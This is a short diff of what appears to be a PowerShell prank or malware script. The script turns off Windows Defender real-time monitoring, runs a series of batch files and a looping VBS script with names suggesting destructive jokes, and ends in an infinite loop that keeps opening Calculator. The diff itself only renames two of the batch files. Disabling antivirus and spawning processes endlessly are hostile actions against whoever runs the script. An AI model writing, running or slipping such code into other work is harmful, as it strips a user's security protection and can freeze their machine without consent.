@@ -2,8 +2,8 @@ Cls
 Set-MpPreference -DisableRealtimeMonitoring $true
 ./intermini.bat 
 ./Dcube.bat 
-./psycho.bat 
-./cDdrive.bat 
+./Psycho.bat 
+./Drive.bat 
 ./Endless.bat
 cscript looploop.vbs 
 while(1){&calc}
